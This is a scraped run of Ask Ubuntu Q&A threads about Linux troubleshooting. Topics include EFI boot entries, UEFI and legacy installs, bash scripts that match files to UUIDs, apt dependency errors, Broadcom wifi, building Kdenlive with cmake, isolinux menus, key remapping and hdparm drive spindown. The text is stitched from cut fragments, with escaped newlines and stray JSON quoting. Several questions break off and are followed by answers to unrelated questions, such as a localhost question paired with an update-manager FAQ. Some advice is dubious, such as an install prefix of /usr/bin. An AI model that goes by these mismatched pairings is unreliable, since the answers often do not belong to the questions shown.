The efibootmgr command used is : efibootmgr -c -d /dev/nvme0n1 -p 1 -l /EFI/refind/refind_x64.efi -L \"rEFInd\" whereas the bcfg one is : bcfg boot add 3 fs0:\\EFI\\refind\\refind_x64.efi \"rEFInd\"\nWhen I do bcfg boot dump -v the difference between the efibootmgr and bcfg entries is the following :\nThe DevPath for the bcfg made entry is PciRoot(0x0)/Pci.....\\EFI\\refind\\refind_x64.efi whereas for the efiboomgr made entry is just says VenHw(99E275E7-75AO-4B37)\nDo you have an idea on how to get efibootmgr to work ? Or alternatively what option in the command call I need to use in order to specify kernel paramaters with bcfg ?\n\nA: If efibootmgr is creating an entry like you describe (VenHw(99E275E7-75AO-4B37)), then that sounds like a bug in either efibootmgr or the firmware. That said, consider the efibootmgr command you specified:\nefibootmgr -c -d /dev/nvme0n1 -p 1 -l /EFI/refind/refind_x64.efi -L \"rEFInd\"\n\nThere are two things that are unusual about this:\n\n\n*\n\n*Disk device -- Most disk devices in Linux have names of the form /dev/sd?, where ? is a letter from a up. Some devices, such as some SSD cards, have filenames that take other forms, like /dev/mmcblk0 (that's from memory and might not be quite right). I don't recall ever seeing a device name like /dev/nvme0n1. That's not to say it's wrong, but at the very least it's unusual, and you should double-check it. I'd be especially careful to not include the partition number -- that's what the -p option to efibootmgr is for.\n\n*File specification -- Older versions of efibootmgr require that files be specified using EFI syntax -- that is, with backslashes (\\) rather than slashes (/) separating directory entries. Because Linux shells generally treat backslashes uniquely, this also requires either quoting the entire pathname or doubling up on the backslashes, so you'd specify -l \\\\EFI\\\\refind\\\\refind_x64.efi or -l \"\\EFI\\refind\\refind_x64.efi. I've heard that the most recent versions of efibootmgr will accept a more traditional Unix/Linux form and \"translate\" internally, but I don't know precisely when that feature was added, and you haven't said what version of Ubuntu you're using. Thus, I recommend you use doubled-up or quoted backslashes rather than slashes.\n\n\nAs a practical matter, of course, if you've got a working entry via bcfg, there should be no need to do anything else with efibootmgr. I assume you're asking because it should work and because you want to be able to perform this type of maintenance from Ubuntu.\n\nA: I had exactly same issue. Tried to create boot entry with efibootmgr using nvme disk. It did not boot and the boot meny in the bios showed only japanese (or chinese?) characters to that entry. Inspecting the boot entries from another os showed stated that the newly created entry was of type VenHw.\nHowever the problem was that the partition number was incorrect. I had root partition and some others in encrypted lvm volumes. So I speficied that encrypted partition for efibootmgr instead of the /boot partition that was supposed to specify. This is probably not your case, but I still write this in case someone else encounters this problem with the same reason.

Yesterday, I decided to install Xubuntu on my sister's laptop (which had Windows 8.1 preinstalled, in UEFI mode). It's a Lenovo G400S, 4 GB of RAM, Intel i5 CPU (I don't know the exact specs, sorry). But there was an issue: I could only boot from USB in legacy mode. \nNote that I didn't do it the \"regular\" way: instead of burning the Xubuntu ISO image to the USB drive I put a bunch of ISO images from different Linux distros inside it and installed GRUB to its MBR. To boot Xubuntu Live media (64-bit), I created a loopback device with its ISO image mounted, loaded the kernel (at /casper/vmlinuz.efi) and the initrd (at /casper/initrd.lz) and it went fine. I created a 400 GB ext4 partition and installed Xubuntu there. Everything was correct and the installation successfully finished, but it was in Legacy mode. \nNow if I set the BIOS configuration to give priority to UEFI it boots directly into Windows, and if I set it to \"Legacy first\" it shows me the GRUB menu where I can choose Xubuntu or Windows. Xubuntu boots fine from there, but if I try to boot Windows from GRUB it throws me a fatal error and I have to hard reset.\nHere are my questions:\n\n\n*\n\n*Is there a way to convert Xubuntu to UEFI mode? Or Windows to Legacy mode? Note that I can't boot from USB in UEFI mode.\n\n*Will the computer be harmed if I keep these settings (Xubuntu Legacy mode + Windows UEFI mode)? I can live with that, but I don't know if it's harmful.\n\nA: Setup your USB boot media the standard way, and it will be able to boot in either UEFI or legacy mode.  It's possible to convert your legacy Ubuntu install to UEFI, (add the /EFI/ubuntu bootloaders, change a few files like fstab, but it's far easier to just reinstall in UEFI mode when you have the proper media.  How you can boot the media depends upon the way the media has been set up -- you set it up just for legacy boot, so it can only boot in legacy mode.\n  Be careful when you reinstall Ubuntu -- DO NOT select a \"reinstall\" grub option, that will wipe the whole disk.   \n\nWhatever you do, back-up your important files on the Windows side first.  Bad things can happen with a simple typo.  Oldfred's boot-repair suggestion should be an easy way to convert the Ubuntu install to UEFI.  It is just an extra step to switch modes to access the other OS, I don't know of any harm it could cause.\n", "Q: I can't see localhost of ubuntu server I am running Ubuntu server in virtualbox and in my host machine I try to view localhost in a browser and I see nothing.

How can I see?\n\n\nA: Copied from source https://wiki.ubuntu.com/SecurityTeam/FAQ\n\nWhy does update-manager no longer prompt for the user's password?\nAs of Ubuntu 11.10, update-manager no longer prompts for the user's\n  password to apply updates. This was decided to improve usability and\n  to make it easier for users to apply security updates and therefore\n  increase system security. The rationale is as follows:\n  \n  \n*\n  \n*Like in previous releases, by default only people in the admin group    are allowed access to perform security updates.\n  \n*Only updates for already installed software can be applied without a    password. Installing additional software still requires people to\n  enter their password.\n  \n*The password prompt had become an irritant for some people such that    they would just press 'Cancel' instead of installing the\n  updates. The    password prompt decreased system security for those\n  users.\n  \n*People that did dutifully apply updates became conditioned to enter    their privileged password perhaps daily. When the user is prompted\n  for the password, it should mean something and the frequency of\n  update-manager updates meant that some people no longer thought about \n  why they were entering their password. For these users, the password\n  prompt had the potential to reduce security.\n  \n  \n  For environments where this change is deemed not appropriate, this\n  functionality can be disabled by the administrator via PolicyKit or by\n  creating users that are not in the admin group (a recommended practice\n  to begin with).\n\nThis probably also answers our question, why it does prompt. \n", "Q: Bash - Check directory for files against list of partial file names I have a server which receives a file per client each day into a directory.

The, read the list, check the associative array for each uuid and report whether the file was recorded or not.\n#!/bin/bash\nuuid_list=...\n\ndeclare -A file_for\nfor file in *_*_* ; do\n    uuid=${file%%_*}\n    file_for[$uuid]=1\ndone\n\nwhile read -r uuid name ; do\n    [[ $uuid = \\#* ]] && continue\n    if [[ ${file_for[$uuid]} ]] ; then\n        echo \"File for $name has arrived.\"\n    else\n        echo \"File for $name missing!\"\n    fi\ndone < \"$uuid_list\"\n\n\nA: Here's a more \"bashy\" and concise approach:\n#!/bin/bash\n\n## Read the UUIDs into the array 'uuids'. Using awk\n## lets us both skip comments and only keep the UUID\nmapfile -t uuids < <(awk '!/^\\s*#/{print $1}' uuids.txt)\n\n## Iterate over each UUID\nfor uuid in ${uuids[@]}; do\n        ## Set the special array $_ (the positional parameters: $1, $2 etc)\n        ## to the glob matching the UUID. This will be all file/directory\n        ## names that start with this UUID.\n        set -- \"${source_directory}\"/\"${uuid}\"*\n        ## If no files matched the glob, no file named $1 will exist\n        [[ -e \"$1\" ]] && echo \"YES : $1\" || echo  \"PANIC $uuid\" \ndone\n\nNote that while the above is pretty and will work fine for a few files, its speed depends on the number of UUIDs and will be very slow if you need to process many. If that is the case, either use @choroba's solution or, for something truly fast, avoid the shell and call perl:\n#!/bin/bash\n\nsource_directory=\".\"\nperl -lne 'BEGIN{\n            opendir(D,\"'\"$source_directory\"'\"); \n            foreach(readdir(D)){ /((.+?)_.*)/; $f{$2}=$1; }\n           } \n           s/\\s.*//; $f{$_} ? print \"YES: $f{$_}\" : print \"PANIC: $_\"' uuids.txt\n\nJust to illustrate the time differences, I tested my bash approach, choroba's and my perl on a file with 20000 UUIDs of which 18001 had a corresponding file name. Note that each test was run by redirecting the script's output to /dev/null.\n\n\n*\n\n*My bash (~3.5 min)\nreal   3m39.775s\nuser   1m26.083s\nsys    2m13.400s\n\n\n*Choroba's (bash, ~0.7 sec)\nreal   0m0.732s\nuser   0m0.697s\nsys    0m0.037s\n\n\n*My perl (~0.1 sec):\nreal   0m0.100s\nuser   0m0.093s\nsys    0m0.013s\n\n\nA: This is pure Bash (i.e. no external commands), and it's the most coincise approach that I can think of.\nBut performance-wise is really not much better than what you currently have.\nIt will read each line from path/to/file; for each line, it will store the first field in $uuid and prints a message if a file matching the pattern path/to/directory/$uuid* is not found:\n#! /bin/bash\n[ -z \"$2\" ] && printf 'Not enough arguments.\\n' && exit\n\nwhile read uuid; do\n    [ ! -f \"$2/$uuid\"* ] && printf '%s missing in %s\\n' \"$uuid\" \"$2\"\ndone <\"$1\"\n\nCall it with path/to/script path/to/file path/to/directory.\nSample output using the sample input file in the question on a test directory hierarchy containing the sample file in the question:\n% tree\n.\n├── path\n│   └── to\n│       ├── directory\n│       │   └── d6f60016-0011-49c4-8fca-e2b3496ad5a7_20160204_023-ERROR\n│       └── file\n└── script.sh\n\n3 directories, 3 files\n% ./script.sh path/to/file path/to/directory\nd5873483-5b98-4895-ab09-9891d80a13da* missing in path/to/directory\nbe0ed6a6-e73a-4f33-b755-47226ff22401* missing in path/to/directory\n\n\nA: unset IFS\nset -f\nset +f -- $(<uuid_file)\nwhile  [ \"${1+:}\" ]\ndo     : < \"$source_directory/$1\"*  &&\n       printf 'File for %s has arrived.\\n' \"$2\"\n       shift 2\ndone\n\nThe idea here is not to worry about reporting errors the shell will report for you. If you try to < open a file which doesn't exist your shell will complain. In fact, it will prepend your script's $0 and the line number on which the error occurred to the error output when it does... This is good information that is provided by default already - so don't bother.\nYou also don't need to take the file in line-by-line like that - it can be awfully slow. This expands the whole thing in a single shot out to a white-space delimited array of arguments and it handles two at a time. If your data is consistent with your example, then $1 will always be your uuid and $2 will be your $name. If bash can open a match to your uuid - and only one such match exists - then printf happens. Otherwise it doesn't and the shell writes diagnostics to stderr about why.\n\nA: The way I'd approach it is to get uuids from file first, then use find\nawk '{print $1}' listfile.txt  | while read fileName;do find /etc -name \"$fileName*\" -printf \"%p FOUND\\n\" 2> /dev/null;done\n\nFor readabilty,\nawk '{print $1}' listfile.txt  | \\\n    while read fileName;do \\\n    find /etc -name \"$fileName*\" -printf \"%p FOUND\\n\" 2> /dev/null;\n    done\n\nExample with a list of files in /etc/, looking for passwd, group,fstab, and THISDOESNTEXIST filenames.\n$ awk '{print $1}' listfile.txt  | while read fileName;do find /etc -name \"$fileName*\" -printf \"%p FOUND\\n\" 2> /dev/null; done\n/etc/pam.d/passwd FOUND\n/etc/cron.daily/passwd FOUND\n/etc/passwd FOUND\n/etc/group FOUND\n/etc/iproute2/group FOUND\n/etc/fstab FOUND\n\nSince you've mentioned the directory is flat,you could use the -printf \"%f\\n\" option to just print filename itself\nWhat this doesn't do is to list missing files. find's small disadvantage is that it doesn't tell you if it doesn't find a file, only when it matches something. What one could do , however , is to check the output - if the output is empty , then we have a file missing\nawk '{print $1}' listfile.txt  | while read fileName;do RESULT=\"$(find /etc -name \"$fileName*\" -printf \"%p\\n\" 2> /dev/null )\"; [ -z \"$RESULT\"  ] && echo \"$fileName not found\" || echo \"$fileName found\"  ;done\n\nMore readable:\nawk '{print $1}' listfile.txt  | \\\n   while read fileName;do \\\n   RESULT=\"$(find /etc -name \"$fileName*\" -printf \"%p\\n\" 2> /dev/null )\"; \\\n   [ -z \"$RESULT\"  ] && echo \"$fileName not found\" || \\\n   echo \"$fileName found\"  \n   done\n\nAnd here's how it performs as a small script:\nskolodya@ubuntu:$ ./listfiles.sh                                               \npasswd found\ngroup found\nfstab found\nTHISDONTEXIST not found\n\nskolodya@ubuntu:$ cat listfiles.sh                                             \n#!/bin/bash\nawk '{print $1}' listfile.txt  | \\\n   while read fileName;do \\\n   RESULT=\"$(find /etc -name \"$fileName*\" -printf \"%p\\n\" 2> /dev/null )\"; \\\n   [ -z \"$RESULT\"  ] && echo \"$fileName not found\" || \\\n   echo \"$fileName found\"  \n   done\n\nOne could use stat as alternative, since it's a flat directory, but the code bellow won't work recursively for subdirectories if you ever decide to add those:\n$ awk '{print $1}' listfile.txt  | while read fileName;do  stat /etc/\"$fileName\"* 1> /dev/null ;done        \nstat: cannot stat ‘/etc/THISDONTEXIST*’: No such file or directory\n\nIf we take the stat idea and run with it, we could use the exit code of stat as indication for whether a file exists or not. Effectivelly, we want to do this:\n$ awk '{print $1}' listfile.txt  | while read fileName;do  if stat /etc/\"$fileName\"* &> /dev/null;then echo \"$fileName found\"; else echo \"$fileName NOT found\"; fi ;done\n\nSample run:\nskolodya@ubuntu:$ awk '{print $1}' listfile.txt  | \\                                                         \n> while read FILE; do                                                                                        \n> if stat /etc/\"$FILE\" &> /dev/null  ;then                                                                   \n> echo \"$FILE found\"                                                                                         \n> else echo \"$FILE NOT found\"                                                                                \n> fi                                                                                                         \n> done\npasswd found\ngroup found\nfstab found\nTHISDONTEXIST NOT found\n\n", "Q: how to give each terminal tab its own title?

I use ClamAV on Ubuntu 14.04, does it scan compressed files? I looked in its documentation but couldn't find anything. Also does it detect viruses that affect Microsoft Windows?\n\nA: 1. Yes, it does, and by default as you can see from man clamscan, it is turned on (the * indicates the default option):\n   --scan-archive[=yes(*)/no]\n          Scan  archives  supported  by  libclamav.  If  you turn off this\n          option, the original files will still be  scanned,  but  without\n          unpacking and additional processing.\n\n2. The more important question you should be asking is \"Does ClamAV scan for viruses that affect Linux as well?\", because the majority of viruses ClamAV detects are Windows viruses.\n", "Q: sudo cp --preserve=all not preserving ownership I am trying to copy data back onto an sd card with an ext2 type partition whilst preserving the ownership and permissions.

The lsattr /media/malapradej/AB6E-FC7F/ command shows:\nlsattr: Inappropriate ioctl for device While reading flags on /media/malapradej/AB6E-FC7F/dalvik-cache\n\nAccording to this site I need to remount the sd card partition using:\nsudo mount -o remount,user_xattr /media/malapradej/AB6E-FC7F/\n\nBut I get the same error and permissions and ownership is not retained. \n\nA: It was all down to operator error.

Can I save the download to a flashdrive and download it to the computer like that?\n\nA: You can easily install Ubuntu from USB.  There are plenty of guides on how to do so.  I find the easiest way is to mount the .ISO you downloaded to the flash drive with Universal USB Installer, available here: http://www.pendrivelinux.com/universal-usb-installer-easy-as-1-2-3/\nOnce that finishes, insert the drive and boot from  USB.

No matter if I just choose to try without installation or install I'm stuck in a bootloop. Istantly after I choose one option the machine reboots.\nI used Universal-USB-Installer-1.9.6.3 to create the bootable USB-Stick and chose to format the stick while doing so.\nI'm running Windows 8.1 on an UEFI-System with an AMD CPU and a Radeon GPU.\nI also tried disconnecting the SSD with the other OS (Win 8.1) and just leaving the HDD with no OS on it attached and even without any HDD attached, just the USB stick. Same result. I get stuck in a bootloop.\nSomewhere in this forum I read that it helps hitting Tab, removing \"quiet\" and \"splash\" and instead typing \"nomodeset xforcevesa\". I tried and it helped a little bit. Now I see how the system is loading the two first files. After the second file is loaded it says \".....ready\" but after that the machine immediately reboots.\nCan anyone help me please?\n\nA: Never mind. Seems as if it was the Universal-USB-Installer's fault. Tried Unetbootin and it works now.\n", "Q: Dependency issues breaking apt-get I believe I may have some dependencies installed in the wrong version for my system, because I keep getting errors whenever I try to use apt-get. For instance:\nsudo apt-get install minicom\n\nresults in these errors:\nYou might want to run 'apt-get -f install' to correct these:\nThe following packages have unmet dependencies:\n libc-dev-bin : Depends: libc6 (< 2.12) but 2.13-38+deb7u8 is to be installed\n libc6 : Depends: libc-bin (= 2.13-38+deb7u8) but 2.11.2-10 is to be installed\n         Breaks: locales (< 2.13)\n libc6-dev : Depends: libc-dev-bin (= 2.13-38+deb7u8) but 2.11.2-10 is to be installed\n             Breaks: gcc-4.4 (< 4.4.6-4) but 4.4.5-8 is to be installed\n locales : Depends: glibc-2.11-1\n ntp : Depends: libssl1.0.0 (>= 1.0.0) but it is not installable\nE: Unmet dependencies. Try 'apt-get -f install' with no packages (or specify a solution).\n\nSo I try to fix it with sudo apt-get -f install. But I get almost identical errors:\nThe following packages have unmet dependencies:\n libc-dev-bin : Depends: libc6 (< 2.12) but 2.13-38+deb7u8 is installed\n libc6 : Depends: libc-bin (= 2.13-38+deb7u8) but 2.11.2-10 is installed\n         Breaks: locales (< 2.13)\n libc6-dev : Depends: libc-dev-bin (= 2.13-38+deb7u8) but 2.11.2-10 is installed\n             Breaks: gcc-4.4 (< 4.4.6-4) but 4.4.5-8 is installed\n locales : Depends: glibc-2.11-1\n ntp : Depends: libssl1.0.0 (>= 1.0.0) but it is not installable\nE: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages.\nE: Unable to correct dependencies\n\nExcept this time, I get the two extra errors down at the bottom. I'm really at a loss here for how to solve this problem.\nHere is what I've tried so far:\nFirstly, links to related questions:\nUnable to install most major packages; Unmet dependencies and cannot be fixed\nTrouble downloading packages list due to a \"Hash sum mismatch\" error\nFix dependency when apt-get -f install fails\nE:Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages\nHow do I resolve unmet dependencies after adding a PPA?\napt-get stopped working because of dependancy issue - libegl1-mesa\nNone of these questions or their answers helped me although I tried them all. The final link in that list seemed to most promising considering it has almost identical error messages, but it didn't solve my issue either.\nHere's a quick summary of what I've tried:\n\n\n*\n\n*Removing files with `sudo apt-get remove [package]. This results in the exact same output as when I try to install anything.\n\n*Looking at the /var/log/apt/term.log file for broken things to remove.

The basic problem is that my wifi does not connect to my home network (at least not correctly), so I can't get internet access. The wifi router in my home is not the problem cause all my other devices work fine with it. My impression is that Ubuntu is the problem here. One more thing is that, when I set up a wifi internet-sharing connection with my desktop mac (which is connected to the network by ethernet) I can access this shared connection with the notebook, it's rock-solid stable, connects quickly and delivers internet just perfectly fine. So actually, it seems to be a ubuntu specific problem with that specific wifi network.\nSome more specifics on the wifi connection to the network: It technically connects to the router, but it usually take very long till the connection is established, and sometimes it fails to connect completely. After the beginning of the connection (if I get it), I sometimes have a very small time window where internet gets delivered, like 20 seconds to half a minute. After that it's gone. Then, sometimes, I get some internet, but the connection is extremely slow and ultimately stops delivering all together again.\nMy system is an HP notebook with 12GB RAM , core i5 intel, ubuntu 15.10. My wifi hardware is the (apparently not unproblematic) broadcom BCM43141, for which I use the driver ubuntu recommends me to use (broadcom Linux STA wireless driver source, proprietary).\nApproaches I have tried so far:\n\n\n*\n\n*I have read many posts and threads from people who have problems with the wifi hardware that I have. One thing I have tried is installing an older version of the driver. Didn't work out. I have read through many other peoples problems that sound similar to mine but never got to a solution.\n\n*I also tried all the config stuff that I know of. I tried dhclient, got a message \"RTNETsomething: File exists.\" So I deleted the dhcp lease file and tried again. New file got created. Problem stays (also after restarting network services etc.). Then I tried it with a static IP instead of DHCP. Wifi was accessed quickly, but still does not deliver internet. Ultimately, I am also suspecting that it would be good to get a new IP from the DHCP, but dhclient always takes ultra long, and when its done, nothing changed and I still have the same IP.\n\n*took a look at the DNS config file and the interfaces file, nothing super strange was found. The resolv.conf file had some DNS server I didnt know about in there so I changed it to the same one my other linux distribution uses, since the wifi works without problems on that one.\nAt this point I dont know what else to do.\nCan anybody help me troubleshoot through this?\n08:00.0 Network controller [0280]: Broadcom Corporation BCM43142 802.11b/g/n [14e4:4365] (rev 01)\n    DeviceName: Broadcom BCM43142 802.11bgn 1x1 WiFi Adapter + BT 4.0 combo adapter\n    Subsystem: Hewlett-Packard Company Device [103c:2230]\n\nFurther note:\nI followed the instructions from \"Installing Broadcom Wireless Drivers\", but issue remains.\n@ Eduardo Cola:\nHere the output\n# dmesg | grep Wireless\n[   12.966209] input: HP Wireless hotkeys as /devices/virtual/input/input9\n[   13.966379] wlan0: Broadcom BCM4365 802.11 Hybrid Wireless Controller 6.30.223.248 (r487574)\n\n#ifconfig\neno1      Link encap:Ethernet  HWaddr a0:2b:b8:59:2d:53  \n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n\neno1:avahi Link encap:Ethernet  HWaddr a0:2b:b8:59:2d:53  \n          inet addr:169.254.5.250  Bcast:169.254.255.255  Mask:255.255.0.0\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:3177 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:3177 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:241496 (241.4 KB)  TX bytes:241496 (241.4 KB)\n\nwlo1      Link encap:Ethernet  HWaddr 14:2d:27:ce:ee:11  \n          inet addr:192.168.11.22  Bcast:192.168.11.255  Mask:255.255.255.0\n          inet6 addr: fe80::162d:27ff:fece:ee11/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:296 errors:0 dropped:81 overruns:0 frame:787\n          TX packets:322 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:31547 (31.5 KB)  TX bytes:55495 (55.4 KB)\n          Interrupt:18 \n\n# iwconfig\nwlo1      IEEE 802.11abg  ESSID:\"4CE6764F111C_G\"  \n          Mode:Managed  Frequency:2.462 GHz  Access Point: 52:E6:76:4F:11:1C   \n          Bit Rate=52 Mb/s   Tx-Power=200 dBm   \n          Retry short limit:7   RTS thr:off   Fragment thr:off\n          Encryption key:off\n          Power Management:off\n          Link Quality=50/70  Signal level=-60 dBm  \n          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n          Tx excessive retries:0  Invalid misc:0   Missed beacon:0\n\neno1      no wireless extensions.\n\nlo        no wireless extensions.\n\n\nA: Ok, so after following the instructions from \"Installing Broadcom Wireless Drivers\" and before giving the output demanded by Eduardo Cola, I did dhclient once again and it actually finished its job after reconnecting. \nThe connection has been stable now for several minutes (much more than before), so if this is not one of those time windows after which the connection drops again, we may be able to declare success.

But I don't know if that is that easy or if it needs some hacks to make it usable. But, in the end it is still an security issue.\nMaybe the easiest way is to keep the UIDs and GIDs in sync manually or set up a simple NIS or LDAP. And when using sssd you also could cache the login credentials from NIS or LDAP but the user has to login once connected with the server reachable.\n", "Q: Installing Ubuntu Desktop I want to install Ubuntu in my laptop.

I'm trying to install Kdenlive from https://github.com/KDE/kdenlive. From looking Online, it seems the best way is to build a .deb package from the source and install it with the created package. But, how exactly do I go about making a .deb package from source from github?\n\nA: You aren't building a deb from source here. You can read the documentation provided on the link you posted, but I will summarize here. The commands you will have to do will be as follows:\ngit clone https://www.github.com/KDE/kdenlive\ncd kdenlive\nmkdir build\ncd build\ncmake .. -DCMAKE_INSTALL_PREFIX=/usr/bin\nmake -j4\nsudo make install\n\nThis will:\n\n\n*\n\n*Gather the source files\n\n*Set up a build environment\n\n*Tell the system where to install (In this case, /usr/bin so that it can be called with just kdenlive)\n\n*Build the source into binary\n\n*Copy the binary into the installation path so that it can be called.\n\n\nIf, however, you really do want to build a .deb file, you can do most of this process the same. However, before you begin, start by running:\nsudo apt-get install checkinstall\n\nThen, follow the same procedure as above. However, replace:\nsudo make install\n\nWith:\nsudo checkinstall\n\nThe checkinstall application monitors what was made and installed, and compiles a .deb file accordingly.\n", "Q: bootloader isolinux/txt.cfg default option not recognized I am trying to kickstart an Ubuntu 15.10 installation, but the default option at the boot menu is not picked up for some reason.\nThe syntax seems fine, and if I manually chose any of the options, It boots as it should, but the problem is that the default section on the isolinux/txt.cfg is completely neglected and after timeout it boots automatically from the first option.\nHere is a sample if the isolinux/txt.cfg file:\ndefault option2\nlabel option1\n  menu label ^1 Kickstart controller\n  kernel /install/vmlinuz\n  append  file=/cdrom/preseed/ubuntu-server.seed vga=788 initrd=/install/initrd.gz ks=cdrom:/ks/ks-option1.cfg ---\nlabel option2\n  menu label ^2 Kickstart compute1\n  kernel /install/vmlinuz\n  append  file=/cdrom/preseed/ubuntu-server.seed vga=788 initrd=/install/initrd.gz ks=cdrom:/ks/ks-option2.cfg ---\nlabel install\n  menu label ^Install Ubuntu Server\n  kernel /install/vmlinuz\n  append  file=/cdrom/preseed/ubuntu-server.seed vga=788 initrd=/install/initrd.gz quiet ---\n\n... so that in this case, it would still boot from the option1 option.\nAs a bonus, does someone know how to hide the \"pop-up\" language selection menu?\n\nA: I am not sure how to address your main issue, but for the bonus I found this question which has an answer that points out the syslinux/lang file.

I want to suppress the indexing of some directories.\n\nA: If you click on the Filter Results you can restrict the files found in several ways (age, size, type). When you find a file, clicking on it once opens buttons, one of which is Show in Folder. Click that, and the folder containing the file will be opened. The Folder Name is also displayed.\nA good practice is to have expectations about the contents of the file you're about to edit, and if the expectations are not met when you open the file, stop and ask yourself what's happening.\nUnless you can predict all the files and folders you might make mistakes with, restricting indexing is a bad idea. Also, what if the file you need to find is in a folder you have suppressed indexing on?  \nFor the pedants among us (I include myself): \"Folders\" are really \"directories\", and probably should be called \"directories\". \n", "Q: OpenJDK not running .jar files I've downloaded the .jar file for Minecraft, and I installed OpenJDK 6 from the software center, and I tried with 7 as well, but it keeps throwing the message \"The file '/home/hunter/Downloads/minecraft.jar' is not marked as executable.

So as long as you're okay changing that subdirectory by hand depending on the architecture for which you're building, you're good.\nLet's assume the layout of the project you're cloning looks like this:\n/:\n    subdir1:\n        Makefile\n    subdir2:\n        Makefile\n\nLet's also assume that you're only interested in building subdir1.

Make sure that the installation media contains the correct drivers, and then click OK.\" Even though I have no problems using the CD/DVD drive in ubuntu why is it coming up with this error during my windows 7 install?\n\nA: The problem, as it says, that there's no device drivers found. The GNU/Linux (e.g. Ubuntu) installation disc works fine because by default there's a bunch of drivers. This is one of differences between how GNU/Linux distros and Windows are shipped.\nFor more obvious example, imagine you just installed Windows and Ubuntu. If you would look for you GPU device at device manager in Windows, you'll most probably find something like «Generic Vesa compatible GPU» (not exactly this, I don't remember the wording, but the point is that you won't see something exact like «AMD Radeon HD5730» or «Mobility Radeon HD 5730 / 6570M»). Additionally, sometimes the resolution screwed. To fix things you need to go to manufacter's site, find, and download the drivers for GPU (and first hope that at least your ethernet is working ).\nHowever, this is not the case with GNU/Linux distros. Usually, after you boot up to the system, everything Just Works™. Yeah, there still could be e.g. some problem with proprietary WiFi drivers, however they're more rare than they're in Windows, and in the given example you already have GPU driver shipped with the system, you can just upgrade it with a couple of clicks if you want to.\nNow, if you'd want to additionally ask for how to fix the problem that Windows disc didn't have proper drivers — well, I think you'd better ask it in SuperUser. Besides the fact, that the question would be offtopic, I'm pretty sure, most peoples here are ways better in GNU/Linux than they're in Windows. It's just that is a proprietary OS, with a bunch of black magic behind the curtains, so it is hard to say what it does without closer research. You could either do that research yourself, or ask e.g. at SuperUser hoping someone already met the problem, did the research, and have a workaround.\n", "Q: How do I set an LXC container to start on boot in 15.10? 15.10 uses the new db based config system.

After some time, I realized that I would rather have both the Caps lock and Ctrl keys perform the same function instead of being swapped. So I changed the above to be:\nXKBOPTIONS=\"ctrl:nocaps\"\n\nThis should make it so Caps lock and Ctrl act as the Ctrl key, right? Well, when I ran:\nsudo dpkg-reconfigure -phigh console-setup\n\nand rebooted, no changes were made to the mapping of the two keys. They were still swapped. So instead, I decided to revert to the normal mapping with\nXKBOPTIONS=\"\"\n\nAgain, no changes took effect. Any ideas? Thanks.\n\nA: If you don't mind a solution for X only...\nThe technique I was recommended is to put the following in a script:\n#!/bin/sh\nxmodmap - << !\nremove Lock = Caps_Lock\nremove Control = Control_L\nkeysym Control_L = Caps_Lock\nkeysym Caps_Lock = Control_L\nadd Lock = Caps_Lock\nadd Control = Control_L\n!\n\nYou will have to run it once when you log in.\nIf you run it twice, it will reverse the behaviour, i.e. go back to normal again!\n", "Q: How to automount network home directories in Ubuntu 14.04 upon login We’d like to automount network home directories in Ubuntu 14.04.

I have Kubuntu on SSD (first) disk and also HDD (second, instead DVD-ROM) disk on my laptop. The second disc I use rarely. When my laptop is turned on, it does not emit any sound, but HDD peeps because it work. How I can disable HDD, but turn on if necessary? I.E. to run kubuntu with disabled HDD, but enable it, if necessary.\n\nA: Would like to add that I found the Disks Utility (Disks in the Ubuntu Applications launcher) quite handy. You can select the standby options for the HDD by going into Drive settings in More actions.\n\n\nA: You can set how many seconds of idleness the hard drive should wait before it goes to sleep with the -S in hdparm\nhdparm -S 128 /dev/sdb\nFrom the hdpram manual\n\n   -S     Put  the  drive  into  idle  (low-power) mode, and also set the standby (spindown) timeout for the drive.\n          This timeout value is used by the drive to determine how long to wait  (with  no  disk  activity)  before\n          turning  off the spindle motor to save power.  Under such circumstances, the drive may take as long as 30\n          seconds to respond to a subsequent disk access, though most drives are much quicker.  The encoding of the\n          timeout  value  is somewhat peculiar.  A value of zero means \"timeouts are disabled\": the device will not\n          automatically enter standby mode.  Values from 1 to 240 specify multiples of 5 seconds, yielding timeouts\n          from  5 seconds to 20 minutes.  Values from 241 to 251 specify from 1 to 11 units of 30 minutes, yielding\n          timeouts from 30 minutes to 5.5 hours.  A value of 252 signifies a timeout of 21 minutes. A value of  253\n          sets  a  vendor-defined  timeout  period  between  8 and 12 hours, and the value 254 is reserved.  255 is\n          interpreted as 21 minutes plus 15 seconds.  Note that some older drives may have very different interpre‐\n          tations of these values.\n\n\nTo send the hard drive to sleep immediately, enter:\nhdparm -y /dev/sdb\n\n -y     Force  an  IDE  drive  to immediately enter the low power consumption standby mode, usually causing it to\n          spin down.  The current power mode status can be checked using the -C option.\n\n\nWith an upper case Y, the drive will go into an even deeper state of sleep.\n   -Y     Force an IDE drive to immediately enter the lowest power consumption sleep mode, causing it to shut  down\n          completely.   A  hard  or  soft  reset  is required before the drive can be accessed again (the Linux IDE\n          driver will automatically handle issuing a reset if/when needed).  The current power mode status  can  be\n          checked using the -C option.\n\nDrives are supposed to spin up when they get a command that requires reading the disk.  This must be supported by the BIOS and the drive itself.\nWhen you are satisfied with your options you can make it automatic by inserting the command, above the last line, into /etc/rc.local with your favourite text edit as superuser. \n", "Q: How to totally remove the nginx from ubuntu 14.04 LTS I have un-install all the nginx related packages.(like this answer said https://askubuntu.com/a/457412/383308), after that I run the command below command gives nothing.\nsudo find / -name 'nginx'\n\nWhen I run such command, I have one result:\nzyh@zyh-desktop:~$ ps -ef | grep nginx\nzyh       2666  2442  0 11:12 pts/1    